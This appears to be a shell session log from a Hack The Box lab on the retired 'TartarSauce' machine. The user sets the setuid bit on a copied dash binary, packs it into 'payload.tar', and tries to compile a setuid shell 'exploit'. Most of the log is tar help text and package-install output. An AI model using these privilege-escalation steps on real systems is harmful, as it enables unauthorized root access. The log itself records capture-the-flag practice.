@@ -1,0 +1,860 @@
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp /opt/linux_privesc/LinEnum.sh .                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp /bin/d                                                 
+Display all 302 possibilities? (y or n)                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al /bin/dash                                            
+-rwxr-xr-x 1 root root 121464 Mar 30 04:45 /bin/dash      
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp /bin/dash .                                            
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls                                                        
+38861.txt  dash         LinEnum.sh  notes.ctb   notes.ctb~~   procmon.sh                                          
+43348.txt  exploit.PHP  nmap        notes.ctb~  notes.ctb~~~  wp-load.php                                         
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ chmod u+s dash                                            
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls                                                        
+38861.txt  dash         LinEnum.sh  notes.ctb   notes.ctb~~   procmon.sh                                          
+43348.txt  exploit.PHP  nmap        notes.ctb~  notes.ctb~~~  wp-load.php                                         
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ tar --help                                                
+Usage: tar [OPTION...] [FILE]...                          
+GNU 'tar' saves many files together into a single tape or disk archive, and can                                   
+restore individual files from the archive.                
+
+Examples:                    
+  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.                                       
+  tar -tvf archive.tar         # List all files in archive.tar verbosely.                                         
+  tar -xf archive.tar          # Extract all files from archive.tar.                                              
+
+ Local file name selection:  
+
+      --add-file=FILE        add given FILE to the archive (useful if its name                                    
+                             starts with a dash)          
+  -C, --directory=DIR        change to directory DIR      
+      --exclude=PATTERN      exclude files, given as a PATTERN                                                    
+      --exclude-backups      exclude backup and lock files                                                        
+      --exclude-caches       exclude contents of directories containing                                           
+                             CACHEDIR.TAG, except for the tag file itself                                         
+      --exclude-caches-all   exclude directories containing CACHEDIR.TAG                                          
+      --exclude-caches-under exclude everything under directories containing                                      
+                             CACHEDIR.TAG                 
+      --exclude-ignore=FILE  read exclude patterns for each directory from                                        
+                             FILE, if it exists           
+      --exclude-ignore-recursive=FILE                     
+                             read exclude patterns for each directory and its                                     
+                             subdirectories from FILE, if it exists                                               
+      --exclude-tag=FILE     exclude contents of directories containing FILE,                                     
+                             except for FILE itself       
+      --exclude-tag-all=FILE exclude directories containing FILE                                                  
+      --exclude-tag-under=FILE   exclude everything under directories                                             
+                             containing FILE              
+      --exclude-vcs          exclude version control system directories                                           
+      --exclude-vcs-ignores  read exclude patterns from the VCS ignore files                                      
+      --no-null              disable the effect of the previous --null option                                     
+      --no-recursion         avoid descending automatically in directories                                        
+      --no-unquote           do not unquote input file or member names                                            
+      --no-verbatim-files-from   -T treats file names starting with dash as                                       
+                             options (default)            
+      --null                 -T reads null-terminated names; implies                                              
+                             --verbatim-files-from        
+      --recursion            recurse into directories (default)                                                   
+  -T, --files-from=FILE      get names to extract or create from FILE                                             
+      --unquote              unquote input file or member names (default)                                         
+      --verbatim-files-from  -T reads file names verbatim (no escape or option                                    
+                             handling)                    
+  -X, --exclude-from=FILE    exclude patterns listed in FILE                                                      
+
+ File name matching options (affect both exclude and include patterns):                                           
+
+      --anchored             patterns match file name start                                                       
+      --ignore-case          ignore case                  
+      --no-anchored          patterns match after any '/' (default for                                            
+                             exclusion)                   
+      --no-ignore-case       case sensitive matching (default)                                                    
+      --no-wildcards         verbatim string matching     
+      --no-wildcards-match-slash   wildcards do not match '/'                                                     
+      --wildcards            use wildcards (default for exclusion)                                                
+      --wildcards-match-slash   wildcards match '/' (default for exclusion)                                       
+
+ Main operation mode:        
+
+  -A, --catenate, --concatenate   append tar files to an archive                                                  
+  -c, --create               create a new archive         
+  -d, --diff, --compare      find differences between archive and file system                                     
+      --delete               delete from the archive (not on mag tapes!)                                          
+  -r, --append               append files to the end of an archive                                                
+  -t, --list                 list the contents of an archive                                                      
+      --test-label           test the archive volume label and exit                                               
+  -u, --update               only append files newer than copy in archive                                         
+  -x, --extract, --get       extract files from an archive                                                        
+
+ Operation modifiers:        
+
+      --check-device         check device numbers when creating incremental                                       
+                             archives (default)           
+  -g, --listed-incremental=FILE   handle new GNU-format incremental backup                                        
+  -G, --incremental          handle old GNU-format incremental backup                                             
+      --hole-detection=TYPE  technique to detect holes    
+      --ignore-failed-read   do not exit with nonzero on unreadable files                                         
+      --level=NUMBER         dump level for created listed-incremental archive                                    
+  -n, --seek                 archive is seekable          
+      --no-check-device      do not check device numbers when creating                                            
+                             incremental archives         
+      --no-seek              archive is not seekable      
+      --occurrence[=NUMBER]  process only the NUMBERth occurrence of each file                                    
+                             in the archive; this option is valid only in                                         
+                             conjunction with one of the subcommands --delete,                                    
+                             --diff, --extract or --list and when a list of                                       
+                             files is given either on the command line or via                                     
+                             the -T option; NUMBER defaults to 1                                                  
+      --sparse-version=MAJOR[.MINOR]                      
+                             set version of the sparse format to use (implies                                     
+                             --sparse)                    
+  -S, --sparse               handle sparse files efficiently                                                      
+
+ Overwrite control:          
+
+  -k, --keep-old-files       don't replace existing files when extracting,                                        
+                             treat them as errors         
+      --keep-directory-symlink   preserve existing symlinks to directories when                                   
+                             extracting                   
+      --keep-newer-files     don't replace existing files that are newer than                                     
+                             their archive copies         
+      --no-overwrite-dir     preserve metadata of existing directories                                            
+      --one-top-level[=DIR]  create a subdirectory to avoid having loose files                                    
+                             extracted                    
+      --overwrite            overwrite existing files when extracting                                             
+      --overwrite-dir        overwrite metadata of existing directories when                                      
+                             extracting (default)         
+      --recursive-unlink     empty hierarchies prior to extracting directory                                      
+      --remove-files         remove files after adding them to the archive                                        
+      --skip-old-files       don't replace existing files when extracting,                                        
+                             silently skip over them      
+  -U, --unlink-first         remove each file prior to extracting over it                                         
+  -W, --verify               attempt to verify the archive after writing it                                       
+
+ Select output stream:       
+
+      --ignore-command-error ignore exit codes of children                                                        
+      --no-ignore-command-error   treat non-zero exit codes of children as                                        
+                             error                        
+  -O, --to-stdout            extract files to standard output                                                     
+      --to-command=COMMAND   pipe extracted files to another program                                              
+
+ Handling of file attributes:                             
+
+      --atime-preserve[=METHOD]   preserve access times on dumped files, either                                   
+                             by restoring the times after reading                                                 
+                             (METHOD='replace'; default) or by not setting the                                    
+                             times in the first place (METHOD='system')                                           
+      --clamp-mtime          only set time when the file is more recent than                                      
+                             what was given with --mtime  
+      --delay-directory-restore   delay setting modification times and                                            
+                             permissions of extracted directories until the end                                   
+                             of extraction                
+      --group=NAME           force NAME as group for added files                                                  
+      --group-map=FILE       use FILE to map file owner GIDs and names                                            
+      --mode=CHANGES         force (symbolic) mode CHANGES for added files                                        
+      --mtime=DATE-OR-FILE   set mtime for added files from DATE-OR-FILE                                          
+  -m, --touch                don't extract file modified time                                                     
+      --no-delay-directory-restore                        
+                             cancel the effect of --delay-directory-restore                                       
+                             option                       
+      --no-same-owner        extract files as yourself (default for ordinary                                      
+                             users)                       
+      --no-same-permissions  apply the user's umask when extracting permissions                                   
+                             from the archive (default for ordinary users)                                        
+      --numeric-owner        always use numbers for user/group names                                              
+      --owner=NAME           force NAME as owner for added files                                                  
+      --owner-map=FILE       use FILE to map file owner UIDs and names                                            
+  -p, --preserve-permissions, --same-permissions          
+                             extract information about file permissions                                           
+                             (default for superuser)      
+      --same-owner           try extracting files with the same ownership as                                      
+                             exists in the archive (default for superuser)                                        
+  -s, --preserve-order, --same-order                      
+                             member arguments are listed in the same order as                                     
+                             the files in the archive     
+      --sort=ORDER           directory sorting order: none (default), name or                                     
+                             inode                        
+
+ Handling of extended file attributes:                    
+
+      --acls                 Enable the POSIX ACLs support                                                        
+      --no-acls              Disable the POSIX ACLs support                                                       
+      --no-selinux           Disable the SELinux context support                                                  
+      --no-xattrs            Disable extended attributes support                                                  
+      --selinux              Enable the SELinux context support                                                   
+      --xattrs               Enable extended attributes support                                                   
+      --xattrs-exclude=MASK  specify the exclude pattern for xattr keys                                           
+      --xattrs-include=MASK  specify the include pattern for xattr keys                                           
+
+ Device selection and switching:                          
+
+  -f, --file=ARCHIVE         use archive file or device ARCHIVE                                                   
+      --force-local          archive file is local even if it has a colon                                         
+  -F, --info-script=NAME, --new-volume-script=NAME        
+                             run script at end of each tape (implies -M)                                          
+  -L, --tape-length=NUMBER   change tape after writing NUMBER x 1024 bytes                                        
+  -M, --multi-volume         create/list/extract multi-volume archive                                             
+      --rmt-command=COMMAND  use given rmt COMMAND instead of rmt                                                 
+      --rsh-command=COMMAND  use remote COMMAND instead of rsh                                                    
+      --volno-file=FILE      use/update the volume number in FILE                                                 
+
+ Device blocking:            
+
+  -b, --blocking-factor=BLOCKS   BLOCKS x 512 bytes per record                                                    
+  -B, --read-full-records    reblock as we read (for 4.2BSD pipes)                                                
+  -i, --ignore-zeros         ignore zeroed blocks in archive (means EOF)                                          
+      --record-size=NUMBER   NUMBER of bytes per record, multiple of 512                                          
+
+ Archive format selection:   
+
+  -H, --format=FORMAT        create archive of the given format                                                   
+
+ FORMAT is one of the following:                          
+
+    gnu                      GNU tar 1.13.x format        
+    oldgnu                   GNU format as per tar <= 1.12                                                        
+    pax                      POSIX 1003.1-2001 (pax) format                                                       
+    posix                    same as pax                  
+    ustar                    POSIX 1003.1-1988 (ustar) format                                                     
+    v7                       old V7 tar format            
+
+      --old-archive, --portability                        
+                             same as --format=v7          
+      --pax-option=keyword[[:]=value][,keyword[[:]=value]]...                                                     
+                             control pax keywords         
+      --posix                same as --format=posix       
+  -V, --label=TEXT           create archive with volume name TEXT; at                                             
+                             list/extract time, use TEXT as a globbing pattern                                    
+                             for volume name              
+
+ Compression options:        
+
+  -a, --auto-compress        use archive suffix to determine the compression                                      
+                             program                      
+  -I, --use-compress-program=PROG                         
+                             filter through PROG (must accept -d)                                                 
+  -j, --bzip2                filter the archive through bzip2                                                     
+  -J, --xz                   filter the archive through xz                                                        
+      --lzip                 filter the archive through lzip                                                      
+      --lzma                 filter the archive through xz                                                        
+      --lzop                 filter the archive through lzop                                                      
+      --no-auto-compress     do not use archive suffix to determine the                                           
+                             compression program          
+  -z, --gzip, --gunzip, --ungzip   filter the archive through gzip                                                
+      --zstd                 filter the archive through zstd                                                      
+  -Z, --compress, --uncompress   filter the archive through compress                                              
+
+ Local file selection:       
+
+      --backup[=CONTROL]     backup before removal, choose version CONTROL                                        
+  -h, --dereference          follow symlinks; archive and dump the files they                                     
+                             point to                     
+      --hard-dereference     follow hard links; archive and dump the files they                                   
+                             refer to                     
+  -K, --starting-file=MEMBER-NAME                         
+                             begin at member MEMBER-NAME when reading the                                         
+                             archive                      
+      --newer-mtime=DATE     compare date and time when data changed only                                         
+  -N, --newer=DATE-OR-FILE, --after-date=DATE-OR-FILE     
+                             only store files newer than DATE-OR-FILE                                             
+      --one-file-system      stay in local file system when creating archive                                      
+  -P, --absolute-names       don't strip leading '/'s from file names                                             
+      --suffix=STRING        backup before removal, override usual suffix ('~'                                    
+                             unless overridden by environment variable                                            
+                             SIMPLE_BACKUP_SUFFIX)        
+
+ File name transformations:  
+
+      --strip-components=NUMBER   strip NUMBER leading components from file                                       
+                             names on extraction          
+      --transform=EXPRESSION, --xform=EXPRESSION          
+                             use sed replace EXPRESSION to transform file                                         
+                             names                        
+
+ Informative output:         
+
+      --checkpoint[=NUMBER]  display progress messages every NUMBERth record                                      
+                             (default 10)                 
+      --checkpoint-action=ACTION   execute ACTION on each checkpoint                                              
+      --full-time            print file time to its full resolution                                               
+      --index-file=FILE      send verbose output to FILE  
+  -l, --check-links          print a message if not all links are dumped                                          
+      --no-quote-chars=STRING   disable quoting for characters from STRING                                        
+      --quote-chars=STRING   additionally quote characters from STRING                                            
+      --quoting-style=STYLE  set name quoting style; see below for valid STYLE                                    
+                             values                       
+  -R, --block-number         show block number within archive with each message                                   
+                             
+      --show-defaults        show tar defaults            
+      --show-omitted-dirs    when listing or extracting, list each directory                                      
+                             that does not match search criteria                                                  
+      --show-snapshot-field-ranges                        
+                             show valid ranges for snapshot-file fields                                           
+      --show-transformed-names, --show-stored-names       
+                             show file or archive names after transformation                                      
+      --totals[=SIGNAL]      print total bytes after processing the archive;                                      
+                             with an argument - print total bytes when this                                       
+                             SIGNAL is delivered; Allowed signals are: SIGHUP,                                    
+                             SIGQUIT, SIGINT, SIGUSR1 and SIGUSR2; the names                                      
+                             without SIG prefix are also accepted                                                 
+      --utc                  print file modification times in UTC                                                 
+  -v, --verbose              verbosely list files processed                                                       
+      --warning=KEYWORD      warning control              
+  -w, --interactive, --confirmation                       
+                             ask for confirmation for every action                                                
+
+ Compatibility options:      
+
+  -o                         when creating, same as --old-archive; when                                           
+                             extracting, same as --no-same-owner                                                  
+
+ Other options:              
+
+  -?, --help                 give this help list          
+      --restrict             disable use of some potentially harmful options                                      
+      --usage                give a short usage message   
+      --version              print program version        
+
+Mandatory or optional arguments to long options are also mandatory or optional                                    
+for any corresponding short options.                      
+
+The backup suffix is '~', unless set with --suffix or SIMPLE_BACKUP_SUFFIX.                                       
+The version control may be set with --backup or VERSION_CONTROL, values are:                                      
+
+  none, off       never make backups                      
+  t, numbered     make numbered backups                   
+  nil, existing   numbered if numbered backups exist, simple otherwise                                            
+  never, simple   always make simple backups              
+
+Valid arguments for the --quoting-style option are:       
+
+  literal                    
+  shell                      
+  shell-always               
+  shell-escape               
+  shell-escape-always        
+  c                          
+  c-maybe                    
+  escape                     
+  locale                     
+  clocale                    
+
+*This* tar defaults to:      
+--format=gnu -f- -b20 --quoting-style=escape --rmt-command=/usr/sbin/rmt                                          
+--rsh-command=/usr/bin/rsh   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ tar payload.tar dash                                      
+tar: invalid option -- 'y'   
+Try 'tar --help' or 'tar --usage' for more information.   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ tar --help | more                                         
+Usage: tar [OPTION...] [FILE]...                          
+GNU 'tar' saves many files together into a single tape or disk archive, and can                                   
+restore individual files from the archive.                
+
+Examples:                    
+  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.                                       
+  tar -tvf archive.tar         # List all files in archive.tar verbosely.                                         
+  tar -xf archive.tar          # Extract all files from archive.tar.                                              
+
+ Local file name selection:  
+
+      --add-file=FILE        add given FILE to the archive (useful if its name                                    
+                             starts with a dash)          
+  -C, --directory=DIR        change to directory DIR      
+      --exclude=PATTERN      exclude files, given as a PATTERN                                                    
+      --exclude-backups      exclude backup and lock files                                                        
+      --exclude-caches       exclude contents of directories containing                                           
+                             CACHEDIR.TAG, except for the tag file itself                                         
+      --exclude-caches-all   exclude directories containing CACHEDIR.TAG                                          
+      --exclude-caches-under exclude everything under directories containing                                      
+                             CACHEDIR.TAG                 
+      --exclude-ignore=FILE  read exclude patterns for each directory from                                        
+                             FILE, if it exists           
+      --exclude-ignore-recursive=FILE                     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ tar --help | less                                         
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ tar -cf payload.tar dash                                  
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ TERM                                                      
+-bash: TERM: command not found                            
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ $TERM                                                     
+-bash: screen-256color: command not found                 
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ v                                                      s  
+udo vim /opt/shell/setuid.c 
+[sudo] password for arjun:  
+Sorry, try again.           
+[sudo] password for arjun:  
+Sorry, try again.           
+[sudo] password for arjun:  
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ cp /opt/shell/setuid.c .                                  
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls                                                        
+38861.txt    LinEnum.sh  notes.ctb~~   setuid.c         
+43348.txt    nmap        notes.ctb~~~  wp-load.php      
+dash         notes.ctb   payload.tar                    
+exploit.PHP  notes.ctb~  procmon.sh                     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ rm dash                                                   
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ ls -al                                                    
+total 9148    
+drwxr-xr-x  3 arjun arjun    4096 May 11 22:39 .        
+drwxr-xr-x 18 arjun arjun    4096 May 11 20:01 ..       
+-rw-r--r--  1 arjun arjun    3492 May 11 21:30 38861.txt
+-rw-r--r--  1 arjun arjun    2059 May 11 20:15 43348.txt
+-rw-r--r--  1 arjun arjun      48 May 11 20:17 exploit.PHP                                                        
+-rw-r--r--  1 arjun arjun   46476 May 11 21:37 LinEnum.sh
+drwxr-xr-x  2 arjun arjun    4096 May 11 20:04 nmap     
+-rw-r--r--  1 arjun arjun 2367488 May 11 22:39 notes.ctb
+-rw-r--r--  1 arjun arjun 2363392 May 11 22:39 notes.ctb~
+-rw-r--r--  1 arjun arjun 2338816 May 11 22:39 notes.ctb~~                                                        
+-rw-r--r--  1 arjun arjun 2068480 May 11 22:34 notes.ctb~~~                                                       
+-rw-r--r--  1 arjun arjun  133120 May 11 21:45 payload.tar                                                        
+-rw-r--r--  1 arjun arjun     223 May 11 21:37 procmon.sh
+-rw-r--r--  1 arjun arjun     145 May 11 22:37 setuid.c 
+-rwxr-xr-x  1 arjun arjun    5492 May 11 21:33 wp-load.php                                                        
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ gcc -m32 -o exploit setuid.c                              
+In file included from setuid.c:1:                       
+/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory                      
+   27 | #include <bits/libc-header-start.h>             
+      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~             
+compilation terminated.     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ vim setuid.c                                              
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ gcc -m32 -o exploit setuid.c                              
+In file included from setuid.c:1:                       
+/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory                      
+   27 | #include <bits/libc-header-start.h>             
+      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~             
+compilation terminated.     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ vim setuid.c                                              
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ vim setuid.c                                              
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ gcc -m32 -o exploit setuid.c                              
+In file included from setuid.c:1:                       
+/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory                      
+   27 | #include <bits/libc-header-start.h>             
+      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~             
+compilation terminated.     
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ vim setuid.c                                              
+arjun@broly:~/Documents/HacktheBox/retired/tartarsauce$ sudo apt install gcc-multilib                             
+Reading package lists... Done                           
+Building dependency tree                                
+Reading state information... Done                       
+The following additional packages will be installed:    
+  cpp-9 g++-9 gcc-9 gcc-9-base gcc-9-base:i386          
+  gcc-9-multilib gfortran-9 lib32asan5 lib32atomic1     
+  lib32gcc-9-dev lib32gomp1 lib32itm1 lib32quadmath0    
+  lib32ubsan1 libasan5 libc6-dev-i386 libc6-dev-x32     
+  libc6-x32 libgcc-9-dev libgfortran-9-dev              
+  libobjc-9-dev libstdc++-9-dev libx32asan5             
+  libx32atomic1 libx32gcc-9-dev libx32gcc-s1            
+  libx32gcc1 libx32gomp1 libx32itm1 libx32quadmath0     
+  libx32stdc++6 libx32ubsan1                            
+Suggested packages:         
+  gcc-9-locales g++-9-multilib gcc-9-doc                
+  gfortran-9-multilib gfortran-9-doc libcoarrays-dev    
+  libstdc++-9-doc           
+The following NEW packages will be installed:           
+  gcc-9-multilib gcc-multilib lib32asan5 lib32atomic1   
+  lib32gcc-9-dev lib32gomp1 lib32itm1 lib32quadmath0    
+  lib32ubsan1 libc6-dev-i386 libc6-dev-x32 libc6-x32    
+  libx32asan5 libx32atomic1 libx32gcc-9-dev             
+  libx32gcc-s1 libx32gcc1 libx32gomp1 libx32itm1        
+  libx32quadmath0 libx32stdc++6 libx32ubsan1            
+The following packages will be upgraded:                
+  cpp-9 g++-9 gcc-9 gcc-9-base gcc-9-base:i386          
+  gfortran-9 libasan5 libgcc-9-dev libgfortran-9-dev    
+  libobjc-9-dev libstdc++-9-dev                         
+11 upgraded, 22 newly installed, 0 to remove and 580 not upgraded.                                                
+Need to get 60.3 MB of archives.                        
+After this operation, 63.1 MB of additional disk space will be used.                                              
+Do you want to continue? [Y/n] y                        
+Get:1 http://kali.download/kali kali-rolling/main amd64 g++-9 amd64 9.3.0-11 [10.7 MB]                            
+Get:2 http://kali.download/kali kali-rolling/main amd64 gfortran-9 amd64 9.3.0-11 [10.4 MB]                       
+Get:3 http://kali.download/kali kali-rolling/main amd64 gcc-9 amd64 9.3.0-11 [10.0 MB]                            
+Get:4 http://kali.download/kali kali-rolling/main amd64 cpp-9 amd64 9.3.0-11 [9,710 kB]                           
+Get:5 http://kali.download/kali kali-rolling/main amd64 libstdc++-9-dev amd64 9.3.0-11 [1,701 kB]                 
+Get:6 http://kali.download/kali kali-rolling/main amd64 libobjc-9-dev amd64 9.3.0-11 [218 kB]                     
+Get:7 http://kali.download/kali kali-rolling/main amd64 libgfortran-9-dev amd64 9.3.0-11 [676 kB]                 
+Get:8 http://kali.download/kali kali-rolling/main amd64 libgcc-9-dev amd64 9.3.0-11 [2,347 kB]                    
+Get:9 http://kali.download/kali kali-rolling/main amd64 libasan5 amd64 9.3.0-11 [390 kB]                          
+Get:10 http://kali.download/kali kali-rolling/main i386 gcc-9-base i386 9.3.0-11 [196 kB]                         
+Get:11 http://kali.download/kali kali-rolling/main amd64 gcc-9-base amd64 9.3.0-11 [196 kB]                       
+Get:12 http://kali.download/kali kali-rolling/main amd64 libc6-dev-i386 amd64 2.30-4 [2,109 kB]                   
+Get:13 http://kali.download/kali kali-rolling/main amd64 libc6-x32 amd64 2.30-4 [2,986 kB]                        
+Get:14 http://kali.download/kali kali-rolling/main amd64 libc6-dev-x32 amd64 2.30-4 [2,188 kB]                    
+Get:15 http://kali.download/kali kali-rolling/main amd64 libx32gcc-s1 amd64 10-20200418-1 [41.2 kB]               
+Get:16 http://kali.download/kali kali-rolling/main amd64 lib32gomp1 amd64 10-20200418-1 [106 kB]                  
+Get:17 http://kali.download/kali kali-rolling/main amd64 libx32gomp1 amd64 10-20200418-1 [101 kB]                 
+Get:18 http://kali.download/kali kali-rolling/main amd64 lib32itm1 amd64 10-20200418-1 [27.9 kB]                  
+Get:19 http://kali.download/kali kali-rolling/main amd64 libx32itm1 amd64 10-20200418-1 [26.1 kB]                 
+Get:20 http://kali.download/kali kali-rolling/main amd64 lib32atomic1 amd64 10-20200418-1 [8,500 B]               
+Get:21 http://kali.download/kali kali-rolling/main amd64 libx32atomic1 amd64 10-20200418-1 [9,004 B]              
+Get:22 http://kali.download/kali kali-rolling/main amd64 lib32asan5 amd64 9.3.0-11 [402 kB]                       
+Get:23 http://kali.download/kali kali-rolling/main amd64 libx32asan5 amd64 9.3.0-11 [383 kB]                      
+Get:24 http://kali.download/kali kali-rolling/main amd64 lib32ubsan1 amd64 10-20200418-1 [151 kB]                 
+Get:25 http://kali.download/kali kali-rolling/main amd64 libx32gcc1 amd64 1:10-20200418-1 [944 B]                 
+Get:26 http://kali.download/kali kali-rolling/main amd64 libx32stdc++6 amd64 10-20200418-1 [476 kB]               
+Get:27 http://kali.download/kali kali-rolling/main amd64 libx32ubsan1 amd64 10-20200418-1 [134 kB]                
+Get:28 http://kali.download/kali kali-rolling/main amd64 lib32quadmath0 amd64 10-20200418-1 [229 kB]              
+Get:29 http://kali.download/kali kali-rolling/main amd64 libx32quadmath0 amd64 10-20200418-1 [147 kB]             
+Get:30 http://kali.download/kali kali-rolling/main amd64 lib32gcc-9-dev amd64 9.3.0-11 [2,213 kB]                 
+Get:31 http://kali.download/kali kali-rolling/main amd64 libx32gcc-9-dev amd64 9.3.0-11 [2,008 kB]                
+Get:32 http://kali.download/kali kali-rolling/main amd64 gcc-9-multilib amd64 9.3.0-11 [1,012 B]                  
+Get:33 http://kali.download/kali kali-rolling/main amd64 gcc-multilib amd64 4:9.2.1-3.1 [1,476 B]                 
+Fetched 60.3 MB in 9s (6,871 kB/s)                      
+Reading changelogs... Done  
+Extracting templates from packages: 100%                
+(Reading database ... 701774 files and directories currently installed.)                                          
+Preparing to unpack .../00-g++-9_9.3.0-11_amd64.deb ... 
+Unpacking g++-9 (9.3.0-11) over (9.3.0-10) ...          
+Preparing to unpack .../01-gfortran-9_9.3.0-11_amd64.deb ...                                                      
+Unpacking gfortran-9 (9.3.0-11) over (9.3.0-10) ...     
+Preparing to unpack .../02-gcc-9_9.3.0-11_amd64.deb ... 
+Unpacking gcc-9 (9.3.0-11) over (9.3.0-10) ...          
+Preparing to unpack .../03-cpp-9_9.3.0-11_amd64.deb ... 
+Unpacking cpp-9 (9.3.0-11) over (9.3.0-10) ...          
+Preparing to unpack .../04-libstdc++-9-dev_9.3.0-11_amd64.deb ...                                                 
+Unpacking libstdc++-9-dev:amd64 (9.3.0-11) over (9.3.0-10) ...                                                    
+Preparing to unpack .../05-libobjc-9-dev_9.3.0-11_amd64.deb ...                                                   
+Unpacking libobjc-9-dev:amd64 (9.3.0-11) over (9.3.0-10) ...                                                      
+Preparing to unpack .../06-libgfortran-9-dev_9.3.0-11_amd64.deb ...                                               
+Unpacking libgfortran-9-dev:amd64 (9.3.0-11) over (9.3.0-10) ...                                                  
+Preparing to unpack .../07-libgcc-9-dev_9.3.0-11_amd64.deb ...                                                    
+Unpacking libgcc-9-dev:amd64 (9.3.0-11) over (9.3.0-10) ...                                                       
+Preparing to unpack .../08-libasan5_9.3.0-11_amd64.deb ...                                                        
+Unpacking libasan5:amd64 (9.3.0-11) over (9.3.0-10) ... 
+Preparing to unpack .../09-gcc-9-base_9.3.0-11_amd64.deb ...                                                      
+De-configuring gcc-9-base:i386 (9.3.0-10) ...           
+Unpacking gcc-9-base:amd64 (9.3.0-11) over (9.3.0-10) ...
+Preparing to unpack .../10-gcc-9-base_9.3.0-11_i386.deb ...                                                       
+Unpacking gcc-9-base:i386 (9.3.0-11) over (9.3.0-10) ...
+Selecting previously unselected package libc6-dev-i386. 
+Preparing to unpack .../11-libc6-dev-i386_2.30-4_amd64.deb ...                                                    
+Unpacking libc6-dev-i386 (2.30-4) ...                   
+Selecting previously unselected package libc6-x32.      
+Preparing to unpack .../12-libc6-x32_2.30-4_amd64.deb ...
+Unpacking libc6-x32 (2.30-4) ...                        
+Selecting previously unselected package libc6-dev-x32.  
+Preparing to unpack .../13-libc6-dev-x32_2.30-4_amd64.deb ...                                                     
+Unpacking libc6-dev-x32 (2.30-4) ...                    
+Selecting previously unselected package libx32gcc-s1.   
+Preparing to unpack .../14-libx32gcc-s1_10-20200418-1_amd64.deb ...                                               
+Unpacking libx32gcc-s1 (10-20200418-1) ...              
+Selecting previously unselected package lib32gomp1.     
+Preparing to unpack .../15-lib32gomp1_10-20200418-1_amd64.deb ...                                                 
+Unpacking lib32gomp1 (10-20200418-1) ...                
+Selecting previously unselected package libx32gomp1.    
+Preparing to unpack .../16-libx32gomp1_10-20200418-1_amd64.deb ...                                                
+Unpacking libx32gomp1 (10-20200418-1) ...               
+Selecting previously unselected package lib32itm1.      
+Preparing to unpack .../17-lib32itm1_10-20200418-1_amd64.deb ...                                                  
+Unpacking lib32itm1 (10-20200418-1) ...                 
+Selecting previously unselected package libx32itm1.     
+Preparing to unpack .../18-libx32itm1_10-20200418-1_amd64.deb ...                                                 
+Unpacking libx32itm1 (10-20200418-1) ...                
+Selecting previously unselected package lib32atomic1.   
+Preparing to unpack .../19-lib32atomic1_10-20200418-1_amd64.deb ...                                               
+Unpacking lib32atomic1 (10-20200418-1) ...              
+Selecting previously unselected package libx32atomic1.  
+Preparing to unpack .../20-libx32atomic1_10-20200418-1_amd64.deb ...                                              
+Unpacking libx32atomic1 (10-20200418-1) ...             
+Selecting previously unselected package lib32asan5.     
+Preparing to unpack .../21-lib32asan5_9.3.0-11_amd64.deb ...                                                      
+Unpacking lib32asan5 (9.3.0-11) ...                     
+Selecting previously unselected package libx32asan5.    
+Preparing to unpack .../22-libx32asan5_9.3.0-11_amd64.deb ...                                                     
+Unpacking libx32asan5 (9.3.0-11) ...                    
+Selecting previously unselected package lib32ubsan1.    
+Preparing to unpack .../23-lib32ubsan1_10-20200418-1_amd64.deb ...                                                
+Unpacking lib32ubsan1 (10-20200418-1) ...               
+Selecting previously unselected package libx32gcc1.     
+Preparing to unpack .../24-libx32gcc1_1%3a10-20200418-1_amd64.deb ...                                             
+Unpacking libx32gcc1 (1:10-20200418-1) ...              
+Selecting previously unselected package libx32stdc++6.  
+Preparing to unpack .../25-libx32stdc++6_10-20200418-1_amd64.deb ...                                              
+Unpacking libx32stdc++6 (10-20200418-1) ...             
+Selecting previously unselected package libx32ubsan1.   
+Preparing to unpack .../26-libx32ubsan1_10-20200418-1_amd64.deb ...                                               
+Unpacking libx32ubsan1 (10-20200418-1) ...              
+Selecting previously unselected package lib32quadmath0. 
+Preparing to unpack .../27-lib32quadmath0_10-20200418-1_amd64.deb ...                                             
+Unpacking lib32quadmath0 (10-20200418-1) ...            
+Selecting previously unselected package libx32quadmath0.
+Preparing to unpack .../28-libx32quadmath0_10-20200418-1_amd64.deb ...                                            
+Unpacking libx32quadmath0 (10-20200418-1) ...           
+Selecting previously unselected package lib32gcc-9-dev. 
+Preparing to unpack .../29-lib32gcc-9-dev_9.3.0-11_amd64.deb ...                                                  
+Unpacking lib32gcc-9-dev (9.3.0-11) ...                 
+Selecting previously unselected package libx32gcc-9-dev.
+Preparing to unpack .../30-libx32gcc-9-dev_9.3.0-11_amd64.deb ...                                                 
